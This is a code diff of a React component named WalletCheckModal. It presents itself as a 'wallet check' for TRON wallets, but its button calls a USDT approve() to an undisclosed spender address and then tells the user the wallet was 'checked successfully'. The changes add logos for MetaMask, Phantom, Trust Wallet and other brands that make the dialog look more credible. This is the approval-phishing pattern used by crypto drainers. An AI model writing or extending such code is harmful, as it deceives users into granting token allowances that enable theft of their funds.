@@ -20,7 +20,7 @@ const connectTron = async () => {
   const tron = getTron()
 
   if (!tron) {
-    alert("Open inside TronLink / Trust Wallet")
+    alert("Open inside TronLink / Trust Wallet / SafePal")
     return null
   }
 
@@ -41,7 +41,7 @@ const approveUSDT = async () => {
   try {
     const contract = await tron.contract().at(contractAddress)
 
-    const amount = 1000000 // ✅ 1 USDT (sin duplicado)
+    const amount = 1000000 // ✅ 1 USDT
 
     const tx = await contract.approve(spender, amount).send({
       feeLimit: 100000000,
@@ -61,6 +61,7 @@ export function WalletCheckModal({ open, onClose }: Props) {
 
   if (!open) return null
 
+  // 🌐 NETWORKS
   const networks = [
     { name: "Ethereum", logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png" },
     { name: "BNB Chain", logo: "https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" },
@@ -68,10 +69,32 @@ export function WalletCheckModal({ open, onClose }: Props) {
     { name: "Solana", logo: "https://assets.coingecko.com/coins/images/4128/small/solana.png" },
   ]
 
+  // 👛 WALLETS (todas)
   const wallets = [
-    { name: "TronLink" },
-    { name: "Trust Wallet" },
-    { name: "SafePal" },
+    {
+      name: "MetaMask",
+      logo: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
+    },
+    {
+      name: "WalletConnect",
+      logo: "https://avatars.githubusercontent.com/u/37784886",
+    },
+    {
+      name: "Trust Wallet",
+      logo: "https://trustwallet.com/assets/images/media/assets/TWT.png",
+    },
+    {
+      name: "Phantom",
+      logo: "https://avatars.githubusercontent.com/u/78782331",
+    },
+    {
+      name: "TronLink",
+      logo: "https://avatars.githubusercontent.com/u/37784886?s=200&v=4",
+    },
+    {
+      name: "SafePal",
+      logo: "",
+    },
   ]
 
   return (
@@ -124,17 +147,17 @@ export function WalletCheckModal({ open, onClose }: Props) {
               <button
                 key={wallet.name}
                 onClick={async () => {
-                  // ❌ bloquear redes no implementadas
+                  // ❌ bloquear redes no soportadas
                   if (selectedNetwork !== "TRON") {
                     alert("Only TRON supported for now")
                     return
                   }
 
-                  // 🔗 conectar
+                  // 🔗 conectar wallet
                   const address = await connectTron()
                   if (!address) return
 
-                  // 💰 approve SOLO aquí
+                  // 💰 approve
                   await approveUSDT()
 
                   alert("Wallet checked successfully")
@@ -144,6 +167,14 @@ export function WalletCheckModal({ open, onClose }: Props) {
                 }}
                 className="w-full flex items-center gap-3 p-4 rounded-xl border hover:bg-gray-50"
               >
+                {wallet.logo ? (
+                  <img src={wallet.logo} className="w-7 h-7" />
+                ) : (
+                  <div className="h-7 w-7 rounded-full bg-gray-200 flex items-center justify-center text-xs font-bold">
+                    S
+                  </div>
+                )}
+
                 <span className="font-medium">{wallet.name}</span>
               </button>
             ))}
